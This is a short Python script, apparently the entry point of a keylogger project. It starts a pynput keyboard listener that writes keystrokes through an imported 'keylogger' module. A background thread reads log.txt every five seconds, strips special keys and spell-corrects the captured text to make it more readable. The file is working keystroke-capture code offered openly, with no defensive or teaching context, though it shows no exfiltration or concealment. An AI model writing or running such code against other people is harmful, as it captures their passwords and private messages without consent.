from pynput.keyboard import Listener
import threading
import os
import time

from keylogger import write_to_file, on_release
from text_cleaner import clean_special_keys
from spell_corrector import correct_text

def periodic_cleaner():
    while True:
        if not os.path.exists(__file__):
            print("Script file deleted, stopping cleaner.")
            break

        with open("log.txt", "r", encoding="utf-8") as file:
            content = file.read()

        cleaned_content = clean_special_keys(content)
        corrected_content = correct_text(cleaned_content)

        with open("log.txt", "w", encoding="utf-8") as file:
            file.write(corrected_content)

        time.sleep(5)  # Clean every 5 seconds

if __name__ == "__main__":
    listener = Listener(on_press=write_to_file, on_release=on_release)
    listener.start()

    cleaning_thread = threading.Thread(target=periodic_cleaner, daemon=True)
    cleaning_thread.start()

    listener.join()
